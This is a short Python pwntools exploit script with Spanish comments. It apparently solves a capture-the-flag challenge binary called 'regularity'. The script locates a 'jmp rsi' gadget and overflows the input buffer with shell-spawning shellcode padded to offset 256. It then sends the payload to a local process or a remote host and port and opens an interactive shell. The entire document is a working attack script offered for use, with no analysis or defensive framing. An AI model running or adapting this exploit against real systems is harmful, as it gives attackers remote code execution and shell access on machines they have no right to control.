#!/usr/bin/python3
import signal
import sys
from pwn import *
from argparse import ArgumentParser

def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicacion...")
    sys.exit(1)

signal.signal(signal.SIGINT, exit_handler)

def exploit(ip, puerto):
    elf = context.binary = ELF('regularity', checksec=False)
    context.arch = 'amd64'

    if ip in ('127.0.0.1', 'localhost'):
        print("[+] Iniciando proceso local")
        p = process() # Cambiado de 'r' a 'p'
    else:
        print("[+] Iniciando proceso remoto")
        p = remote(ip, int(puerto))

    # Buscamos la instrucción jmp rsi en el binario
    try:
        JMP_RSI = next(elf.search(asm('jmp rsi')))
        print(f"[+] Gadget jmp rsi encontrado en: {hex(JMP_RSI)}")
    except StopIteration:
        print("[–] No se encontró el gadget 'jmp rsi' en el binario.")
        sys.exit(1)

    payload = flat({
        0:      asm(shellcraft.sh()),
        256:    JMP_RSI
    })

    p.sendlineafter(b'days?\n', payload)
    p.interactive()

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="Direccion IP del host a analizar", required=True)
    parser.add_argument("-p", "--port", help="Puerto del host a analizar")

    args = parser.parse_args()
    exploit(args.ip, args.port)
